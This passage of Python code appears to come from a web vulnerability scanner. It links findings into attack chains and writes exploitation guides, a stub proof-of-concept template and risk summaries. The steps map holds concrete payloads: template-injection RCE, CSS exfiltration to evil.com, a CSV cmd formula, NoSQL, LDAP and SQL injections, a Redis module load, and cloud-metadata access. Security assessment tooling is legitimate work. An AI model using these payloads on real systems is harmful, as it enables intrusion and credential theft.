            vuln_types.update(normalized_types)
            for norm_type in normalized_types:
                if norm_type not in vuln_index:
                    vuln_index[norm_type] = []
                vuln_index[norm_type].append(finding)

        for finding in result.browser_findings:
            vuln_type = finding.get('vuln_type', 'xss')
            normalized_types = _normalize_vuln_type(vuln_type)
            vuln_types.update(normalized_types)
            for norm_type in normalized_types:
                if norm_type not in vuln_index:
                    vuln_index[norm_type] = []
                vuln_index[norm_type].append(finding)

        for finding in result.smuggling_findings:
            vuln_type = finding.get('vuln_type', 'request_smuggling')
            normalized_types = _normalize_vuln_type(vuln_type)
            vuln_types.update(normalized_types)
            for norm_type in normalized_types:
                if norm_type not in vuln_index:
                    vuln_index[norm_type] = []
                vuln_index[norm_type].append(finding)

        for finding in result.business_logic_findings:
            vuln_type = finding.get('category', 'business_logic')
            normalized_types = _normalize_vuln_type(vuln_type)
            vuln_types.update(normalized_types)
            for norm_type in normalized_types:
                if norm_type not in vuln_index:
                    vuln_index[norm_type] = []
                vuln_index[norm_type].append(finding)

        # P0-P2 Scanner findings
        for finding in result.jwt_findings:
            vuln_type = finding.get('vuln_type', 'jwt_attack')
            normalized_types = _normalize_vuln_type(vuln_type)
            vuln_types.update(normalized_types)
            for norm_type in normalized_types:
                if norm_type not in vuln_index:
                    vuln_index[norm_type] = []
                vuln_index[norm_type].append(finding)

        for finding in result.nosql_findings:
            vuln_type = finding.get('vuln_type', 'nosql_injection')
            normalized_types = _normalize_vuln_type(vuln_type)
            vuln_types.update(normalized_types)
            for norm_type in normalized_types:
                if norm_type not in vuln_index:
                    vuln_index[norm_type] = []
                vuln_index[norm_type].append(finding)

        for finding in result.ssti_findings:
            vuln_type = finding.get('vuln_type', 'ssti')
            normalized_types = _normalize_vuln_type(vuln_type)
            vuln_types.update(normalized_types)
            for norm_type in normalized_types:
                if norm_type not in vuln_index:
                    vuln_index[norm_type] = []
                vuln_index[norm_type].append(finding)

        for finding in result.deserialization_findings:
            vuln_type = finding.get('vuln_type', 'deserialization')
            normalized_types = _normalize_vuln_type(vuln_type)
            vuln_types.update(normalized_types)
            for norm_type in normalized_types:
                if norm_type not in vuln_index:
                    vuln_index[norm_type] = []
                vuln_index[norm_type].append(finding)

        for finding in result.ldap_findings:
            vuln_type = finding.get('vuln_type', 'ldap_injection')
            normalized_types = _normalize_vuln_type(vuln_type)
            vuln_types.update(normalized_types)
            for norm_type in normalized_types:
                if norm_type not in vuln_index:
                    vuln_index[norm_type] = []
                vuln_index[norm_type].append(finding)

        for finding in result.saml_findings:
            vuln_type = finding.get('vuln_type', 'saml_attack')
            normalized_types = _normalize_vuln_type(vuln_type)
            vuln_types.update(normalized_types)
            for norm_type in normalized_types:
                if norm_type not in vuln_index:
                    vuln_index[norm_type] = []
                vuln_index[norm_type].append(finding)

        for finding in result.prototype_pollution_findings:
            vuln_type = finding.get('vuln_type', 'prototype_pollution')
            normalized_types = _normalize_vuln_type(vuln_type)
            vuln_types.update(normalized_types)
            for norm_type in normalized_types:
                if norm_type not in vuln_index:
                    vuln_index[norm_type] = []
                vuln_index[norm_type].append(finding)

        for finding in result.grpc_findings:
            vuln_type = finding.get('vuln_type', 'grpc')
            normalized_types = _normalize_vuln_type(vuln_type)
            vuln_types.update(normalized_types)
            for norm_type in normalized_types:
                if norm_type not in vuln_index:
                    vuln_index[norm_type] = []
                vuln_index[norm_type].append(finding)

        # P0 Critical Scanner findings
        for finding in result.sqli_findings:
            vuln_type = finding.get('vuln_type', 'sqli')
            normalized_types = _normalize_vuln_type(vuln_type)
            vuln_types.update(normalized_types)
            for norm_type in normalized_types:
                if norm_type not in vuln_index:
                    vuln_index[norm_type] = []
                vuln_index[norm_type].append(finding)

        for finding in result.ssrf_findings:
            vuln_type = finding.get('vuln_type', 'ssrf')
            normalized_types = _normalize_vuln_type(vuln_type)
            vuln_types.update(normalized_types)
            for norm_type in normalized_types:
                if norm_type not in vuln_index:
                    vuln_index[norm_type] = []
                vuln_index[norm_type].append(finding)

        for finding in result.path_traversal_findings:
            vuln_type = finding.get('vuln_type', 'path_traversal')
            normalized_types = _normalize_vuln_type(vuln_type)
            vuln_types.update(normalized_types)
            for norm_type in normalized_types:
                if norm_type not in vuln_index:
                    vuln_index[norm_type] = []
                vuln_index[norm_type].append(finding)

        for finding in result.cors_findings:
            vuln_type = finding.get('vuln_type', 'cors_misconfiguration')
            normalized_types = _normalize_vuln_type(vuln_type)
            vuln_types.update(normalized_types)
            for norm_type in normalized_types:
                if norm_type not in vuln_index:
                    vuln_index[norm_type] = []
                vuln_index[norm_type].append(finding)

        # P1 + New Advanced Scanners
        for finding in result.xxe_findings:
            vuln_type = finding.get('vuln_type', 'xxe')
            normalized_types = _normalize_vuln_type(vuln_type)
            vuln_types.update(normalized_types)
            for norm_type in normalized_types:
                if norm_type not in vuln_index:
                    vuln_index[norm_type] = []
                vuln_index[norm_type].append(finding)

        for finding in result.subdomain_takeover_findings:
            vuln_type = finding.get('vuln_type', 'subdomain_takeover')
            normalized_types = _normalize_vuln_type(vuln_type)
            vuln_types.update(normalized_types)
            for norm_type in normalized_types:
                if norm_type not in vuln_index:
                    vuln_index[norm_type] = []
                vuln_index[norm_type].append(finding)
            # Also index secondary vuln_type (phishing)
            secondary = finding.get('secondary_vuln_type')
            if secondary:
                secondary_normalized = _normalize_vuln_type(secondary)
                vuln_types.update(secondary_normalized)
                for norm_type in secondary_normalized:
                    if norm_type not in vuln_index:
                        vuln_index[norm_type] = []
                    vuln_index[norm_type].append(finding)

        for finding in result.hpp_findings:
            vuln_type = finding.get('vuln_type', 'hpp')
            normalized_types = _normalize_vuln_type(vuln_type)
            vuln_types.update(normalized_types)
            for norm_type in normalized_types:
                if norm_type not in vuln_index:
                    vuln_index[norm_type] = []
                vuln_index[norm_type].append(finding)

        for finding in result.client_side_findings:
            vuln_type = finding.get('vuln_type', 'client_side_attack')
            normalized_types = _normalize_vuln_type(vuln_type)
            vuln_types.update(normalized_types)
            for norm_type in normalized_types:
                if norm_type not in vuln_index:
                    vuln_index[norm_type] = []
                vuln_index[norm_type].append(finding)

        for finding in result.oauth_leak_findings:
            vuln_type = finding.get('vuln_type', 'oauth_token_leak')
            normalized_types = _normalize_vuln_type(vuln_type)
            vuln_types.update(normalized_types)
            for norm_type in normalized_types:
                if norm_type not in vuln_index:
                    vuln_index[norm_type] = []
                vuln_index[norm_type].append(finding)

        for finding in result.pdf_ssrf_findings:
            vuln_type = finding.get('vuln_type', 'pdf_ssrf')
            normalized_types = _normalize_vuln_type(vuln_type)
            vuln_types.update(normalized_types)
            for norm_type in normalized_types:
                if norm_type not in vuln_index:
                    vuln_index[norm_type] = []
                vuln_index[norm_type].append(finding)

        for finding in result.unicode_norm_findings:
            vuln_type = finding.get('vuln_type', 'unicode_normalization')
            normalized_types = _normalize_vuln_type(vuln_type)
            vuln_types.update(normalized_types)
            for norm_type in normalized_types:
                if norm_type not in vuln_index:
                    vuln_index[norm_type] = []
                vuln_index[norm_type].append(finding)

        for finding in result.redis_injection_findings:
            vuln_type = finding.get('vuln_type', 'redis_injection')
            normalized_types = _normalize_vuln_type(vuln_type)
            vuln_types.update(normalized_types)
            for norm_type in normalized_types:
                if norm_type not in vuln_index:
                    vuln_index[norm_type] = []
                vuln_index[norm_type].append(finding)

        for finding in result.rate_limiting_findings:
            vuln_type = finding.get('vuln_type', 'no_rate_limiting')
            normalized_types = _normalize_vuln_type(vuln_type)
            vuln_types.update(normalized_types)
            for norm_type in normalized_types:
                if norm_type not in vuln_index:
                    vuln_index[norm_type] = []
                vuln_index[norm_type].append(finding)

        for finding in result.cache_poisoning_findings:
            vuln_type = finding.get('vuln_type', 'cache_poisoning')
            normalized_types = _normalize_vuln_type(vuln_type)
            vuln_types.update(normalized_types)
            for norm_type in normalized_types:
                if norm_type not in vuln_index:
                    vuln_index[norm_type] = []
                vuln_index[norm_type].append(finding)

        for finding in result.dns_rebinding_findings:
            vuln_type = finding.get('vuln_type', 'dns_rebinding_risk')
            normalized_types = _normalize_vuln_type(vuln_type)
            vuln_types.update(normalized_types)
            for norm_type in normalized_types:
                if norm_type not in vuln_index:
                    vuln_index[norm_type] = []
                vuln_index[norm_type].append(finding)

        # NEW: Index validated chains with secondary vuln_types
        for validated_finding in result.validated_chains:
            secondary_type = validated_finding.get('secondary_vuln_type')
            if secondary_type:
                normalized_types = _normalize_vuln_type(secondary_type)
                vuln_types.update(normalized_types)
                for norm_type in normalized_types:
                    if norm_type not in vuln_index:
                        vuln_index[norm_type] = []
                    vuln_index[norm_type].append(validated_finding)

        # Match against chain patterns
        for chain_pattern in _ATTACK_CHAINS:
            pattern_types = chain_pattern['pattern']

            # Check if all pattern types are present
            if all(pt in vuln_types for pt in pattern_types):
                # Build chain
                chain_vulns = []
                for pt in pattern_types:
                    chain_vulns.extend(vuln_index.get(pt, [])[:1])  # Take first of each type

                if chain_vulns:
                    chain = AttackChain(
                        chain_id=f"CHAIN-{len(chains)+1}",
                        name=chain_pattern['name'],
                        severity=chain_pattern['severity'],
                        description=chain_pattern['description'],
                        vulnerabilities=chain_vulns,
                        impact=self._calculate_chain_impact(chain_pattern, chain_vulns),
                        exploitation_steps=self._generate_exploit_steps(chain_pattern, chain_vulns),
                        poc_script=self._generate_poc_script(chain_pattern, chain_vulns),
                    )
                    chains.append(chain)

        return chains

    def _calculate_chain_impact(self, pattern: dict, vulns: List[dict]) -> str:
        """Calculate business impact of attack chain"""
        impact_map = {
            # Original
            'IDOR to Privilege Escalation': 'Complete account compromise with admin access',
            'Race Condition to Balance Manipulation': 'Financial loss via balance manipulation',
            '2FA Bypass to Account Takeover': 'Account takeover without 2FA',
            'CAPTCHA Bypass to Automated Abuse': 'Automated abuse (credential stuffing, spam)',
            'Race Condition to Duplicate Resource Creation': 'Revenue loss via duplicate redemption',
            # P2 Advanced
            'SQLi to RCE via LOAD_FILE': 'Remote code execution leading to full server compromise',
            'XSS to Session Hijacking via Stored Payload': 'Admin session theft via persistent XSS',
            'SSRF to Internal Service Exploitation': 'Internal network compromise + cloud metadata theft',
            'GraphQL Batching to Resource Exhaustion': 'Service denial via resource exhaustion',
            'JWT None Algorithm to Authentication Bypass': 'Complete authentication bypass, access any account',
            'Path Traversal to Source Code Disclosure': 'Source code + credentials exposure',
            'XXE to SSRF Amplification': 'Cloud infrastructure compromise via XML attack chain',
            # Additional
            'OAuth Token Leakage to Account Takeover': 'Full account access via leaked OAuth tokens',
            'CSV Injection to Remote Code Execution': 'Command execution when victim opens exported file',
            'Subdomain Takeover to Phishing': 'Convincing phishing on legitimate trusted domain',
            'NoSQL Injection to Authentication Bypass': 'Login as any user via MongoDB operator injection',
            'CORS Misconfiguration to Credential Theft': 'Attacker site steals authenticated data via CORS',
            'Deserialization to Remote Code Execution': 'Arbitrary code execution via pickle/java gadget chains',
            'Server-Side Template Injection to RCE': 'System command execution via template engine',
            'HTTP Request Smuggling to Cache Poisoning': 'Mass poisoning via CL.TE desync attack',
            # Cutting-edge
            'DOM Clobbering to Prototype Pollution to XSS': 'DOM manipulation leads to universal XSS via polluted prototypes',
            'WebSocket Upgrade Smuggling to Session Fixation': 'Attacker controls victim session via WebSocket desync',
            'DNS Rebinding to SSRF to Cloud Metadata Access': 'Time-based DNS attack bypasses SSRF filters for cloud credentials',
            'CSS Injection to Credential Exfiltration': 'Keylogging via CSS attribute selectors stealing passwords',
            'PDF Generation to SSRF to RCE': 'PDF converter SSRF chains to file read and code execution',
            'JWT kid Header to SQL Injection to Auth Bypass': 'JWT key ID injection loads attacker-controlled signing key',
            'SAML Signature Wrapping to SSO Bypass': 'XML manipulation bypasses signature to impersonate any SSO user',
            'gRPC Reflection to Business Logic Bypass': 'Internal gRPC methods exposed enabling payment/auth bypass',
            'Service Worker Poisoning to Persistent XSS': 'Malicious service worker persists across sessions intercepting all traffic',
            'Unicode Normalization to Authentication Bypass': 'Homograph attack creates admin clone bypassing uniqueness checks',
            'WebRTC STUN/TURN to Internal Network Pivot': 'Browser leaks internal IP enabling targeted internal network attacks',
            'Redis Command Injection to RCE via MODULE LOAD': 'Malicious Redis module loaded achieving full RCE',
            'GraphQL Persisted Queries to Cache Poisoning': 'Attacker-controlled query ID poisons cache for all users',
            'LDAP Injection to Privilege Escalation': 'Filter injection bypasses authentication returning admin accounts',
            'HTTP Parameter Pollution to WAF Bypass to SQLi': 'Parameter duplication confuses WAF allowing injection',
        }

        return impact_map.get(pattern['name'], 'Security compromise')

    def _generate_exploit_steps(self, pattern: dict, vulns: List[dict]) -> List[str]:
        """Generate step-by-step exploitation guide"""
        steps_map = {
            # Original
            'IDOR to Privilege Escalation': [
                '1. Authenticate as low-privilege user',
                '2. Identify admin resource ID via IDOR',
                '3. Access admin resource with user credentials',
                '4. Escalate privileges using admin endpoint',
            ],
            'Race Condition to Balance Manipulation': [
                '1. Identify balance check endpoint',
                '2. Send 20 parallel withdrawal requests',
                '3. Exploit TOCTOU race in balance validation',
                '4. Withdraw more than available balance',
            ],
            '2FA Bypass to Account Takeover': [
                '1. Bypass 2FA using parameter removal',
                '2. Access victim account via IDOR',
                '3. Change email/password',
                '4. Complete account takeover',
            ],
            # P2 Advanced
            'SQLi to RCE via LOAD_FILE': [
                '1. Identify SQL injection point',
                '2. Use LOAD_FILE() to read /etc/passwd',
                '3. Write webshell via INTO OUTFILE to web root',
                '4. Execute remote commands via webshell',
            ],
            'XSS to Session Hijacking via Stored Payload': [
                '1. Inject stored XSS payload in profile/comment',
                '2. Payload steals document.cookie on admin view',
                '3. Admin visits page, session token exfiltrated',
                '4. Hijack admin session using stolen token',
            ],
            'SSRF to Internal Service Exploitation': [
                '1. Identify SSRF-vulnerable parameter',
                '2. Access AWS metadata: http://169.254.169.254/latest/meta-data',
                '3. Extract IAM credentials from metadata',
                '4. Use credentials to access S3/EC2/RDS',
            ],
            'GraphQL Batching to Resource Exhaustion': [
                '1. Identify GraphQL batching support',
                '2. Send 100+ expensive queries in single batch',
                '3. Overwhelm CPU/memory resources',
                '4. Cause service denial for other users',
            ],
            'JWT None Algorithm to Authentication Bypass': [
                '1. Capture valid JWT token',
                '2. Modify alg header to "none"',
                '3. Remove signature, modify user_id claim',
                '4. Access any account without signature verification',
            ],
            'Path Traversal to Source Code Disclosure': [
                '1. Identify file download/include endpoint',
                '2. Use ../ traversal to escape web root',
                '3. Read source files: ../../../../app/config.py',
                '4. Extract hardcoded credentials/API keys',
            ],
            'XXE to SSRF Amplification': [
                '1. Identify XML input endpoint',
                '2. Inject XXE entity: <!ENTITY xxe SYSTEM "http://internal">',
                '3. XXE triggers SSRF to internal services',
                '4. Access cloud metadata via SSRF chain',
            ],
            # Additional
            'OAuth Token Leakage to Account Takeover': [
                '1. Find OAuth token in referer header/logs',
                '2. Extract access_token from leaked URL',
                '3. Use token in Authorization: Bearer header',
                '4. Access victim account with full permissions',
            ],
            'CSV Injection to Remote Code Execution': [
                '1. Inject formula in user input: =cmd|"/c calc"!A1',
                '2. Export data to CSV via admin panel',
                '3. Admin downloads and opens CSV in Excel',
                '4. Formula executes system command on admin machine',
            ],
            'Subdomain Takeover to Phishing': [
                '1. Find dangling DNS record pointing to unclaimed service',
                '2. Claim subdomain on service (S3/GitHub Pages/Heroku)',
                '3. Host phishing page on legitimate subdomain',
                '4. Send phishing emails from trusted domain',
            ],
            'NoSQL Injection to Authentication Bypass': [
                '1. Identify MongoDB login endpoint',
                '2. Inject operator: {"username": {"$ne": null}, "password": {"$ne": null}}',
                '3. Bypass authentication without credentials',
                '4. Access admin panel as first user in database',
            ],
            'CORS Misconfiguration to Credential Theft': [
                '1. Find API with Access-Control-Allow-Origin: *',
                '2. Host malicious page making authenticated requests',
                '3. Victim visits page while logged in',
                '4. Steal sensitive data via cross-origin request',
            ],
            'Deserialization to Remote Code Execution': [
                '1. Find deserialization of untrusted data',
                '2. Generate malicious pickle/java payload (ysoserial)',
                '3. Send crafted serialized object',
                '4. Achieve code execution via gadget chain',
            ],
            'Server-Side Template Injection to RCE': [
                '1. Identify template injection: {{7*7}} → 49',
                '2. Detect engine (Jinja2/Twig/Freemarker)',
                '3. Inject RCE payload: {{request.application.__globals__.__builtins__.__import__("os").popen("id").read()}}',
                '4. Execute system commands via template',
            ],
            'HTTP Request Smuggling to Cache Poisoning': [
                '1. Identify CL.TE desync vulnerability',
                '2. Craft smuggled request with malicious response',
                '3. Poison cache for popular endpoint',
                '4. All users receive malicious cached response',
            ],
            # Cutting-edge
            'DOM Clobbering to Prototype Pollution to XSS': [
                '1. Inject HTML: <form name="__proto__"><input name="xss" value="<script>alert(1)</script>">',
                '2. DOM clobbering overwrites Object.prototype.xss',
                '3. Application code accesses polluted prototype',
                '4. XSS executes via prototype pollution',
            ],
            'WebSocket Upgrade Smuggling to Session Fixation': [
                '1. Send request with smuggled WebSocket upgrade',
                '2. First request fixes session ID in backend',
                '3. Second request upgrades WebSocket with fixed session',
                '4. Victim uses attacker-controlled session',
            ],
            'DNS Rebinding to SSRF to Cloud Metadata Access': [
                '1. Setup domain with 0 TTL returning attacker IP then 127.0.0.1',
                '2. Application checks domain (passes - external IP)',
                '3. DNS rebinds to 127.0.0.1 before request',
                '4. Access http://169.254.169.254 via rebinding',
            ],
            'CSS Injection to Credential Exfiltration': [
                '1. Inject CSS: input[name="password"][value^="a"] { background: url(//evil.com?a) }',
                '2. Repeat for all characters building selectors',
                '3. User enters password, CSS exfils each character',
                '4. Reconstruct password from background image requests',
            ],
            'PDF Generation to SSRF to RCE': [
                '1. Inject HTML with file:/// or SSRF payload',
                '2. PDF generator (wkhtmltopdf) processes HTML',
                '3. Read local files: <iframe src="file:///etc/passwd">',
                '4. Chain to RCE via phar:// or expect:// wrapper',
            ],
            'JWT kid Header to SQL Injection to Auth Bypass': [
                '1. Capture JWT with kid header',
                '2. Modify kid: "key1" UNION SELECT "attacker-secret"--',
                '3. Application queries DB with injected SQL',
                '4. Sign JWT with attacker-controlled key from injection',
            ],
            'SAML Signature Wrapping to SSO Bypass': [
                '1. Capture valid SAML response',
                '2. Clone <Assertion> outside <Signature> scope',
                '3. Modify cloned assertion with admin user',
                '4. Signature validates original, app uses cloned assertion',
            ],
            'gRPC Reflection to Business Logic Bypass': [
                '1. Query gRPC reflection: grpcurl -plaintext host:port list',
                '2. Discover internal methods (AdminService/BypassPayment)',
                '3. Call internal method directly',
                '4. Bypass business logic via exposed internal API',
            ],
            'Service Worker Poisoning to Persistent XSS': [
                '1. Find XSS in service worker registration path',
                '2. Register malicious service worker',
                '3. Worker intercepts all fetch events',
                '4. Inject XSS in every response permanently',
            ],
            'Unicode Normalization to Authentication Bypass': [
                '1. Register user: аdmin (Cyrillic "а")',
                '2. Database normalizes to NFC: admin',
                '3. Login with "admin" checks DB',
                '4. Access admin account via normalization collision',
            ],
            'WebRTC STUN/TURN to Internal Network Pivot': [
                '1. Force victim browser to WebRTC connection',
                '2. Leak internal IP via STUN: 10.0.0.5',
                '3. Port scan internal network via WebRTC',
                '4. Target internal services with leaked topology',
            ],
            'Redis Command Injection to RCE via MODULE LOAD': [
                '1. Find Redis command injection (EVAL, SET)',
                '2. Upload malicious .so: CONFIG SET dir /tmp; MODULE LOAD /tmp/evil.so',
                '3. Module contains system() wrapper',
                '4. Execute commands via loaded module',
            ],
            'GraphQL Persisted Queries to Cache Poisoning': [
                '1. Find persisted query feature',
                '2. Upload malicious query with known ID',
                '3. Trigger cache: GET /graphql?id=abc&variables={}',
                '4. All users get poisoned cached response',
            ],
            'LDAP Injection to Privilege Escalation': [
                '1. Inject LDAP filter: *)(uid=*))(|(uid=*',
                '2. Modified filter returns all users',
                '3. Extract admin DN from response',
                '4. Login as admin via LDAP bypass',
            ],
            'HTTP Parameter Pollution to WAF Bypass to SQLi': [
                '1. Send duplicate params: id=1&id=\' OR 1=1--',
                '2. WAF sees first param (benign)',
                '3. Backend uses second param (malicious)',
                '4. SQL injection executes bypassing WAF',
            ],
        }

        return steps_map.get(pattern['name'], ['1. Exploit vulnerability chain'])

    def _generate_poc_script(self, pattern: dict, vulns: List[dict]) -> str:
        """Generate proof-of-concept exploit script"""
        # Simplified PoC generation
        if not vulns:
            return ""

        first_vuln = vulns[0]
        url = first_vuln.get('url', '')

        poc = f"""#!/usr/bin/env python3
# PoC for {pattern['name']}
# Target: {self.target}

import requests
import asyncio
import httpx

def exploit():
    \"\"\"
    {pattern['description']}
    \"\"\"
    target_url = "{url}"

    # Step 1: {pattern['name']}
    print("[*] Exploiting {pattern['name']}...")

    # Add exploit logic here based on vulnerability type

    print("[+] Exploitation complete!")

if __name__ == "__main__":
    exploit()
"""
        return poc

    # ── Risk Scoring ──────────────────────────────────────────────────────────

    def _calculate_risk_score(self, result: AdvancedScanResult) -> float:
        """
        Calculate overall risk score (0-10).

        Factors:
        - Number of critical findings
        - Attack chain presence
        - Severity distribution
        """
        score = 0.0

        # Base score from findings
        severity_weights = {
            'critical': 3.0,
            'high': 2.0,
            'medium': 1.0,
            'low': 0.5,
        }

        all_findings = (
            [f.to_dict() for f in result.idor_findings] +
            [f.to_dict() for f in result.race_findings] +
            [f.to_dict() for f in result.bypass_findings]
        )

        for finding in all_findings:
            severity = finding.get('severity', 'low')
            score += severity_weights.get(severity, 0.5)

        # Attack chain multiplier
        if result.attack_chains:
            score *= 1.5

        # Cap at 10
        return min(10.0, score)

    # ── Executive Summary ─────────────────────────────────────────────────────

    def _generate_summary(self, result: AdvancedScanResult) -> str:
        """Generate executive summary"""
        critical_count = sum(
            1 for f in (result.idor_findings + result.race_findings + result.bypass_findings)
            if getattr(f, 'severity', 'low') == 'critical'
        )

        high_count = sum(
            1 for f in (result.idor_findings + result.race_findings + result.bypass_findings)
            if getattr(f, 'severity', 'low') == 'high'
        )

        summary = f"""
Advanced Security Scan Results for {self.target}

Total Findings: {result.total_findings}
- IDOR Vulnerabilities: {len(result.idor_findings)}
- Race Conditions: {len(result.race_findings)}
- Auth Bypasses: {len(result.bypass_findings)}
- GraphQL Issues: {len(result.graphql_findings)}
- Browser Vulnerabilities: {len(result.browser_findings)}
- Request Smuggling: {len(result.smuggling_findings)}
- Business Logic Flaws: {len(result.business_logic_findings)}

Chain Validation: {len(result.validated_chains)} chains validated

Severity Breakdown:
- Critical: {critical_count}
- High: {high_count}

Attack Chains Detected: {len(result.attack_chains)}
{self._format_chains(result.attack_chains)}

Risk Score: {result.risk_score:.1f}/10 - {"CRITICAL" if result.risk_score >= 7 else "HIGH" if result.risk_score >= 4 else "MEDIUM"}

Recommended Actions:
{"- IMMEDIATE: Fix validated attack chains" if result.validated_chains else ""}
{"- IMMEDIATE: Fix attack chains" if result.attack_chains else ""}
{"- HIGH PRIORITY: Patch critical vulnerabilities" if critical_count > 0 else ""}
- Implement multi-account validation
- Add race condition protection
- Strengthen authentication controls
- Review business logic flows
"""
        return summary.strip()

    def _format_chains(self, chains: List[AttackChain]) -> str:
        """Format attack chains for summary"""
        if not chains:
            return "None"

        lines = []
        for chain in chains:
            lines.append(f"  • {chain.name} ({chain.severity})")
        return "\n".join(lines)


# ─────────────────────────────────────────────────────────────────────────────
# Convenience function
# ─────────────────────────────────────────────────────────────────────────────

async def run_unified_scan(
    target: str,
    account_configs: Optional[List[Dict]] = None,
    **kwargs,
) -> AdvancedScanResult:
    """
    Convenience function to run unified advanced scan.

    Args:
        target: Target domain/URL
        account_configs: List of account configs for multi-account testing
        **kwargs: Additional options

    Returns:
        AdvancedScanResult
    """
    scanner = UnifiedAdvancedScanner(target)
    return await scanner.run_full_scan(account_configs=account_configs, **kwargs)
